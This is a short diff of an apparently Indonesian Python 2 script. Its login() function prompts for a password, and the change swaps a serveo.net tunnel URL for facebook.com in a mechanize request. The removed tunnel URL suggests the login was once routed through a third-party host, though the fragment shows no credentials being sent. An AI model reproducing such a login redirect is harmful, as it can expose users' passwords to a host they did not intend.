@@ -70,7 +70,7 @@ def login():
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
-            br.open('https://acerbus.serveo.net')
+            br.open('https://www.facebook.com')
         except mechanize.URLError:
             print '\n\x1b[1;91m[!] Tidak ada koneksi'
             keluar()
